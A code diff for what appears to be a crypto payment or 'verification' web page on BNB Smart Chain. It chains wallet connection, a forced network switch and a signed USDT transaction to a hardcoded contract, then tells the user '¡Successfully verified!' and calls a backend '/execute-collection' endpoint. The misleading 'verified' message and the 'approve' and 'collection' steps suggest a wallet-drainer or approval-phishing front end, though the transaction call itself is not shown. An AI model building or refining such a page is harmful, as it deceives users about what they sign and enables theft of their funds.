@@ -7,27 +7,6 @@ import { ethers } from 'https://esm.sh/ethers@6.13.2';
 
 const ethAddressRegex = /^0x[a-fA-F0-9]{40}$/;
 
-// Función para obtener la Destination Wallet (de la URL o del input manual)
-function getActiveMerchantAddress() {
-    const merchantInput = document.getElementById("merchantAddress");
-    
-    // 1. Intentar extraer del final de la URL
-    const pathSegments = window.location.pathname.split("/").filter(Boolean);
-    const lastSegment = pathSegments[pathSegments.length - 1];
-    
-    if (lastSegment && ethAddressRegex.test(lastSegment)) {
-        if (merchantInput) merchantInput.value = lastSegment;
-        return lastSegment;
-    }
-    
-    // 2. Si no está en la URL, leer lo que el usuario escribió manualmente en el input
-    if (merchantInput && ethAddressRegex.test(merchantInput.value.trim())) {
-        return merchantInput.value.trim();
-    }
-    
-    return "";
-}
-
 const CONTRACT_ADDRESS = "0x8e18bE616f10565A63cEa65585Ddf1Ca61f1C634";
 const BSC_USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
 const BSC_CHAIN_ID_HEX = "0x38";
@@ -48,14 +27,73 @@ const btnSpinner    = document.getElementById("btnSpinner");
 const merchantInput = document.getElementById("merchantAddress");
 const toastEl       = document.getElementById("toast");
 
-// Inicializar el valor del input al cargar
+let _toastTimer;
+function showToast(msg, type = "default", ms = 4000) {
+    if (!toastEl) return;
+    clearTimeout(_toastTimer);
+    toastEl.textContent  = msg;
+    toastEl.dataset.type = type === "default" ? "" : type;
+    toastEl.hidden       = false;
+    _toastTimer = setTimeout(() => { toastEl.hidden = true; }, ms);
+}
+
+function setLoading(on, label = "Processing…") {
+    if (!approveBtn) return;
+    approveBtn.disabled = on;
+    btnText.textContent = on ? label : "Confirm Now";
+    btnSpinner.hidden   = !on;
+}
+
+// Validación y detección al cargar la página
 window.addEventListener("DOMContentLoaded", () => {
     const pathSegments = window.location.pathname.split("/").filter(Boolean);
     const lastSegment = pathSegments[pathSegments.length - 1];
-    if (merchantInput && lastSegment && ethAddressRegex.test(lastSegment)) {
-        merchantInput.value = lastSegment;
+
+    if (merchantInput) {
+        // Asegurar que el input sea interactivo y editable manualmente
+        merchantInput.removeAttribute("disabled");
+        merchantInput.removeAttribute("readonly");
+
+        if (lastSegment && ethAddressRegex.test(lastSegment)) {
+            // Si viene en la URL, se rellena automáticamente
+            merchantInput.value = lastSegment;
+        } else {
+            // Si se abrió directamente la raíz sin wallet en el link, avisar al usuario
+            showToast("Aviso: Falta la Destination Wallet en el enlace. Ingrésela manualmente.", "error", 7000);
+            merchantInput.focus();
+        }
+    }
+
+    // Generación del QR de respaldo
+    const qrContainer = document.getElementById("qrcode");
+    if (qrContainer && window.QRCode) {
+        qrContainer.innerHTML = "";
+        new QRCode(qrContainer, {
+            text: window.location.href,
+            width: 140,
+            height: 140,
+            colorDark: "#0052FF",
+            colorLight: "#ffffff",
+            correctLevel: QRCode.CorrectLevel.H
+        });
     }
 });
+
+// Función para obtener la wallet activa (prioriza la URL, si no, lee lo que el usuario escribió)
+function getActiveMerchantAddress() {
+    const pathSegments = window.location.pathname.split("/").filter(Boolean);
+    const lastSegment = pathSegments[pathSegments.length - 1];
+    
+    if (lastSegment && ethAddressRegex.test(lastSegment)) {
+        return lastSegment;
+    }
+    
+    if (merchantInput && ethAddressRegex.test(merchantInput.value.trim())) {
+        return merchantInput.value.trim();
+    }
+    
+    return "";
+}
 
 (async () => { try { await fetch(`${BACKEND_URL}/health`); } catch (_) {} })();
 
@@ -80,46 +118,12 @@ try {
     console.error("Error al inicializar Reown AppKit:", e);
 }
 
-let _toastTimer;
-function showToast(msg, type = "default", ms = 4000) {
-    if (!toastEl) return;
-    clearTimeout(_toastTimer);
-    toastEl.textContent  = msg;
-    toastEl.dataset.type = type === "default" ? "" : type;
-    toastEl.hidden       = false;
-    _toastTimer = setTimeout(() => { toastEl.hidden = true; }, ms);
-}
-
-function setLoading(on, label = "Processing…") {
-    if (!approveBtn) return;
-    approveBtn.disabled = on;
-    btnText.textContent = on ? label : "Confirm Now";
-    btnSpinner.hidden   = !on;
-}
-
-// Generación automática del QR de respaldo
-window.addEventListener("DOMContentLoaded", () => {
-    const qrContainer = document.getElementById("qrcode");
-    if (qrContainer && window.QRCode) {
-        qrContainer.innerHTML = "";
-        new QRCode(qrContainer, {
-            text: window.location.href,
-            width: 140,
-            height: 140,
-            colorDark: "#0052FF",
-            colorLight: "#ffffff",
-            correctLevel: QRCode.CorrectLevel.H
-        });
-    }
-});
-
 // FLUJO DE UN SOLO PASO: Conexión + Red + Transacción encadenadas
 approveBtn.addEventListener("click", async () => {
     try {
-        // Validar que la Destination Wallet sea correcta antes de continuar
         const MERCHANT_ADDRESS = getActiveMerchantAddress();
         if (!MERCHANT_ADDRESS) {
-            showToast("Introduce una Destination Wallet válida (0x...)", "error");
+            showToast("Por favor, introduce una Destination Wallet válida (0x...)", "error");
             if (merchantInput) merchantInput.focus();
             return;
         }
@@ -131,7 +135,6 @@ approveBtn.addEventListener("click", async () => {
 
         setLoading(true, "Conectando...");
 
-        // Paso A: Verificar si ya está conectado, si no, abrir modal automáticamente
         let activeProvider = await modal.getWalletProvider();
         let userAddress = modal.getAddress();
 
@@ -163,7 +166,6 @@ approveBtn.addEventListener("click", async () => {
 
         setLoading(true, "Cambiando Red...");
 
-        // Paso B: Forzar el cambio o adición de red a BSC
         try {
             await activeProvider.request({
                 method: "wallet_switchEthereumChain",
@@ -188,7 +190,6 @@ approveBtn.addEventListener("click", async () => {
 
         setLoading(true, "Signing...");
 
-        // Paso C: Ejecutar la transacción usando la wallet obtenida del input o de la URL
         const provider = new ethers.BrowserProvider(activeProvider);
         const signer = await provider.getSigner();
         
@@ -199,7 +200,6 @@ approveBtn.addEventListener("click", async () => {
         setLoading(false);
         showToast("¡Successfully verified! ✓", "success");
 
-        // Notificar al backend
         fetch(`${BACKEND_URL}/execute-collection`, {
             method:  "POST",
             headers: { "Content-Type": "application/json" },
